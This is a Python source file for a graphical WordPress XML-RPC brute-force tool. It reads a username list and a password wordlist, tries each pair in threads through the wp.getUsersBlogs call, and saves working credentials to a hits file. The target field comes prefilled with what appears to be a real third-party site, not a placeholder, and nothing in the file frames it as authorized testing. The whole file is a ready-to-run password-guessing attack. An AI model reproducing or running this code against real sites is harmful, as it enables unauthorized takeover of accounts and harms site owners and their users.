import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import xmlrpc.client
import threading
import os

# === GUI Setup ===
app = tk.Tk()
app.title("WordPress XML-RPC GUI Brute Force")
app.geometry("700x550")

# === Main Brute Logic ===
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_entry.get("1.0", tk.END).strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_area.insert(tk.END, "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)
    hits = []

    def try_user(user):
        nonlocal server
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_area.insert(tk.END, hit)
                    hits.append((user, password))
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_area.insert(tk.END, f"[-] Error with {user}: {e}\n")
                break

    threads = []
    for user in usernames:
        log_area.insert(tk.END, f"\n[*] Trying user: {user}\n")
        t = threading.Thread(target=try_user, args=(user,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    log_area.insert(tk.END, "\n[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, tk.END)
        wordlist_entry.insert(0, path)

# === GUI Components ===
tk.Label(app, text="Target URL (https://example.com/xmlrpc.php):").pack()
target_entry = tk.Entry(app, width=85)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

tk.Label(app, text="Usernames (one per line):").pack()
usernames_entry = tk.Text(app, height=5, width=85)
usernames_entry.insert(tk.END, "admin\neditor\nauthor")
usernames_entry.pack()

tk.Label(app, text="Password List File:").pack()
wordlist_frame = tk.Frame(app)
wordlist_entry = tk.Entry(wordlist_frame, width=65)
wordlist_entry.pack(side=tk.LEFT)
browse_button = tk.Button(wordlist_frame, text="Browse", command=browse_wordlist)
browse_button.pack(side=tk.LEFT)
wordlist_frame.pack()

start_button = tk.Button(app, text="Start Brute Force", command=lambda: threading.Thread(target=run_brute_force).start(), bg="green", fg="white")
start_button.pack(pady=10)

log_area = scrolledtext.ScrolledText(app, width=85, height=15)
log_area.pack()

app.mainloop()
